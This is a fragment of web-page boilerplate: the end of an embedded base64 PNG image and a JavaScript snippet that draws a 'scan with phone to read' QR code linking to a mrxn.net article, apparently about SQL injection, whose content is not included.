aIexz4Fg5WWqEimXyZbDXKjeadKNdN2Q8pTfHhwPJ5Or+wFMfc7DnkxeCc+kjLgb7XDTB6IRgLewx2hWqTgb7GmAlnzjVypKQLwO2H1vDV4R9TvoYOAd7rPWHA6miy/+5E5gGkmlmC9CnmRyYi2aFYM13atIP3APm7zfRpL9w5BKvENxbdbIzDVgbjfQyMA8dxcuihZ4Lp7wsccVpIDV5+T9/Am0g0CcJ3V9tSdOtdqZJLnqYe4O5aFJTEayp3KN++lYca+F+f7AGjLVHesM+F75irRv9NpAxccXvOYHpD1SZ5Nl2wE8BGFc14Fz6gONoK46axI9owH2BlG0/AUGPkwBaLr2TG+PwwjE3xtKAe8uvBuahY83Lh567bohO5IPsGsjpMH4+2d46GZfOtawYTeXkg69c8kLxMtjnwDEg2cOmXrIUyD+yaM4Q2L58nWnSH6wd41qb3IhVEx/cL3GtuW5ITuVDsH1TB08NHsez1wDuk+mvtLDWnNWMfcA9gDE1xekrTBLYbgocY7SPILjPSqt1V1a11w2pp/EBfhvIanJH3NG+wU8H0CTA9gQ2ojjpHyoxuAZmjDaYGmG4ILg+cUXpZZW754P7qU620ouXrXJHHLgvcP3F8PZhH+2GZF/QpwV7P5pHUE9JtdRUDtw/uWA0iYUjB66FGaWvBrMGzI19Ewtrj+qDa1ccOAfGlaZy8rVWbBqIBJe97wSugbzv7Jcr/5WB5LrVFWC+sjUvf1UnPpa8MFxQ3GjJBcf8Ko72EUx9tImF4R7BM81fGcjZAlfuuRN4+UDAN0VPkQwcA22nwPajMeyxCR501F8WOez7wXGsOhl0TfqIlx3F4StKL6tcfPAaiSu+fCB1scu/fwLTQDTVI7vfrivSIwzMTwWYizaYmopgbTjYx+Erpt8Kq676j2jBa0PHsS49R77G0VScBlKTl//zJ9AGAn3acO6/apvgdc/65wmLBlwDhJoQmL5HTaIHCHCf7KHiA+WHEnBf4Hrr5PZhH+2GfNi+/tnt/A8AAP//VJqSSQAAAAZJREFUAwAXMlqeC6A+KwAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/esafenet-WorkFlowAction-sqli-2.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 